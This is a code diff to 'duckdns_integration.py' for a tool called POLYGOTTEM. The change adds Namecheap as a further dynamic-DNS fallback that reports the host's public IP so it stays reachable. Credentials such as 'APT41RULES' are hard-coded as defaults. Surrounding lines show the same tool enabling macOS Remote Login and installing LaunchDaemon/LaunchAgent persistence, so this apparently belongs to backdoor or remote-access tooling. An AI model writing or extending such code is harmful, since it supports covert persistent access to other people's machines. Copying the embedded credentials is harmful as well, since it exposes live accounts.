@@ -112,9 +112,12 @@ class DuckDNSIntegration:
                  dyndns_pass: Optional[str] = "APT41RULES",
                  noip_domain: Optional[str] = "all.ddnskey.com",
                  noip_user: Optional[str] = "3btmnv1",
-                 noip_pass: Optional[str] = "vsUre6qPUfWy"):
+                 noip_pass: Optional[str] = "vsUre6qPUfWy",
+                 namecheap_domain: Optional[str] = "all.ddnskey.com",
+                 namecheap_user: Optional[str] = "APT41",
+                 namecheap_pass: Optional[str] = "APT41RULES"):
         """
-        Initialize DuckDNS integration with DynDNS and No-IP fallbacks
+        Initialize DuckDNS integration with DynDNS, No-IP, and Namecheap fallbacks
 
         DEV MODE: Default credentials are pre-filled for testing.
         IMPORTANT: Change these before production use!
@@ -129,6 +132,9 @@ class DuckDNSIntegration:
             noip_domain: No-IP domain (default: all.ddnskey.com for DEV)
             noip_user: No-IP username (default: 3btmnv1 for DEV)
             noip_pass: No-IP password (default: vsUre6qPUfWy for DEV)
+            namecheap_domain: Namecheap domain (default: all.ddnskey.com for DEV)
+            namecheap_user: Namecheap username (default: APT41 for DEV)
+            namecheap_pass: Namecheap password (default: APT41RULES for DEV)
         """
         self.domain = domain.replace('.duckdns.org', '')  # Extract subdomain
         self.full_domain = f"{self.domain}.duckdns.org"
@@ -152,6 +158,13 @@ class DuckDNSIntegration:
         self.noip_user = noip_user
         self.noip_pass = noip_pass
         self.noip_update_url = "https://dynupdate.no-ip.com/nic/update"
+
+        # Namecheap fallback configuration
+        self.namecheap_enabled = namecheap_domain is not None
+        self.namecheap_domain = namecheap_domain
+        self.namecheap_user = namecheap_user
+        self.namecheap_pass = namecheap_pass
+        self.namecheap_update_url = "https://dynamicdns.park-your-domain.com/update"
 
     def enable_macos_remote_login(self) -> bool:
         """
@@ -801,10 +814,112 @@ python3 {os.path.abspath(__file__)} --update
             print(f"✗ Error updating No-IP: {e}")
             return False
 
+    def update_namecheap(self, ip: Optional[str] = None, max_retries: int = 3) -> bool:
+        """
+        Update Namecheap with current IP (fourth fallback option)
+
+        Args:
+            ip: IP address to register (auto-detect if None)
+            max_retries: Number of retry attempts for failed updates
+
+        Returns:
+            True if update successful, False otherwise
+        """
+        if not self.namecheap_enabled:
+            return False
+
+        try:
+            # Get IP if not provided
+            if ip is None:
+                ip = self.get_public_ip()
+                if ip is None:
+                    print("✗ Failed to detect public IP for Namecheap update")
+                    return False
+
+            # Validate IP address format
+            if not validate_ip_address(ip):
+                print(f"✗ Invalid IP address format for Namecheap: {ip}")
+                return False
+
+            # Extract hostname from domain (e.g., "subdomain" from "subdomain.example.com")
+            domain_parts = self.namecheap_domain.split('.')
+            hostname = domain_parts[0] if len(domain_parts) > 0 else self.namecheap_domain
+
+            # Attempt update with retries
+            for attempt in range(1, max_retries + 1):
+                try:
+                    # Namecheap uses HTTP Basic Auth
+                    from requests.auth import HTTPBasicAuth
+
+                    params = {
+                        'domain': self.namecheap_domain,
+                        'host': hostname,
+                        'password': self.namecheap_pass,
+                        'ip': ip
+                    }
+
+                    print(f"[*] Sending update to Namecheap (attempt {attempt}/{max_retries})...")
+                    response = requests.get(
+                        self.namecheap_update_url,
+                        params=params,
+                        timeout=10
+                    )
+
+                    # Check response
+                    if response.status_code not in [200, 400]:
+                        print(f"✗ HTTP {response.status_code}: {response.text}")
+                        if attempt < max_retries:
+                            print(f"[*] Retrying in 3 seconds...")
+                            time.sleep(3)
+                            continue
+                        return False
+
+                    response_text = response.text.strip()
+
+                    # Namecheap returns XML, check for success
+                    if '<ErrCount>0</ErrCount>' in response_text:
+                        print(f"✓ Namecheap API response: Success")
+                        print(f"✓ Namecheap updated: {self.namecheap_domain} → {ip}")
+                        return True
+
+                    elif 'Invalid domain' in response_text or 'Invalid host' in response_text:
+                        print(f"✗ Namecheap update failed: Invalid domain or host")
+                        return False
+
+                    elif 'Invalid password' in response_text:
+                        print(f"✗ Namecheap update failed: Invalid password")
+                        return False
+
+                    elif 'Blacklisted IP' in response_text:
+                        print(f"✗ Namecheap update failed: IP is blacklisted")
+                        return False
+
+                    else:
+                        print(f"✗ Unexpected Namecheap response: {response_text[:100]}")
+                        if attempt < max_retries:
+                            print(f"[*] Retrying in 2 seconds...")
+                            time.sleep(2)
+                            continue
+                        return False
+
+                except requests.exceptions.RequestException as e:
+                    print(f"✗ Network error updating Namecheap: {e}")
+                    if attempt < max_retries:
+                        print(f"[*] Retrying in 3 seconds...")
+                        time.sleep(3)
+                        continue
+                    return False
+
+            return False
+
+        except Exception as e:
+            print(f"✗ Error updating Namecheap: {e}")
+            return False
+
     def update_duckdns(self, ip: Optional[str] = None, verify: bool = True, max_retries: int = 3) -> bool:
         """
         Update DuckDNS with current IP (with validation and verification)
-        Falls back to DynDNS then No-IP if DuckDNS fails
+        Falls back to DynDNS → No-IP → Namecheap if DuckDNS fails
 
         Args:
             ip: IP address to register (auto-detect if None)
@@ -922,6 +1037,14 @@ python3 {os.path.abspath(__file__)} --update
                 print("\n[*] DynDNS update failed, attempting No-IP fallback...")
                 print("-" * 70)
                 if self.update_noip(ip=ip, max_retries=max_retries):
+                    return True
+                print("-" * 70)
+
+            # If No-IP also failed, try Namecheap
+            if self.namecheap_enabled:
+                print("\n[*] No-IP update failed, attempting Namecheap fallback...")
+                print("-" * 70)
+                if self.update_namecheap(ip=ip, max_retries=max_retries):
                     return True
                 print("-" * 70)
 
@@ -1274,11 +1397,11 @@ python3 {os.path.abspath(__file__)} --update
 
 
 def main():
-    """CLI interface for DuckDNS integration with DynDNS fallback"""
+    """CLI interface for DuckDNS integration with multi-service fallback"""
     import argparse
 
     parser = argparse.ArgumentParser(
-        description="DuckDNS Integration for POLYGOTTEM (with DynDNS fallback)",
+        description="DuckDNS Integration for POLYGOTTEM (with DynDNS, No-IP, Namecheap fallbacks)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -1288,7 +1411,7 @@ Examples:
   # Full setup (DuckDNS + SSH)
   python3 duckdns_integration.py --full
 
-  # Update with DynDNS fallback enabled
+  # Update with DynDNS fallback
   python3 duckdns_integration.py --update \\
     --dyndns-domain example.dyndns.org \\
     --dyndns-user username \\
@@ -1302,6 +1425,18 @@ Examples:
     --noip-domain example.no-ip.org \\
     --noip-user username \\
     --noip-pass password
+
+  # Update with all 3 fallback services (DynDNS + No-IP + Namecheap)
+  python3 duckdns_integration.py --update \\
+    --dyndns-domain example.dyndns.org \\
+    --dyndns-user username \\
+    --dyndns-pass password \\
+    --noip-domain example.no-ip.org \\
+    --noip-user username \\
+    --noip-pass password \\
+    --namecheap-domain example.com \\
+    --namecheap-user namecheap-user \\
+    --namecheap-pass namecheap-pass
 
   # macOS: Install persistence (LaunchDaemons + LaunchAgents)
   python3 duckdns_integration.py --install-macos-persistence
@@ -1397,6 +1532,21 @@ Examples:
         type=str,
         help='No-IP password for fallback'
     )
+    parser.add_argument(
+        '--namecheap-domain',
+        type=str,
+        help='Namecheap domain for fallback (e.g., example.com)'
+    )
+    parser.add_argument(
+        '--namecheap-user',
+        type=str,
+        help='Namecheap username for fallback'
+    )
+    parser.add_argument(
+        '--namecheap-pass',
+        type=str,
+        help='Namecheap password for fallback'
+    )
 
     args = parser.parse_args()
 
@@ -1408,7 +1558,10 @@ Examples:
         dyndns_pass=args.dyndns_pass,
         noip_domain=args.noip_domain,
         noip_user=args.noip_user,
-        noip_pass=args.noip_pass
+        noip_pass=args.noip_pass,
+        namecheap_domain=args.namecheap_domain,
+        namecheap_user=args.namecheap_user,
+        namecheap_pass=args.namecheap_pass
     )
 
     # Show selected port for user awareness
@@ -1417,12 +1570,14 @@ Examples:
         print(f"   (Use --port to specify custom port)\n")
 
     # Show DNS fallback status
-    if duckdns.dyndns_enabled or duckdns.noip_enabled:
+    if duckdns.dyndns_enabled or duckdns.noip_enabled or duckdns.namecheap_enabled:
         print(f"\n[*] DNS Fallback Services Enabled:")
         if duckdns.dyndns_enabled:
             print(f"    • DynDNS: {duckdns.dyndns_domain}")
         if duckdns.noip_enabled:
             print(f"    • No-IP: {duckdns.noip_domain}")
+        if duckdns.namecheap_enabled:
+            print(f"    • Namecheap: {duckdns.namecheap_domain}")
         print()
 
     # Handle macOS persistence installation
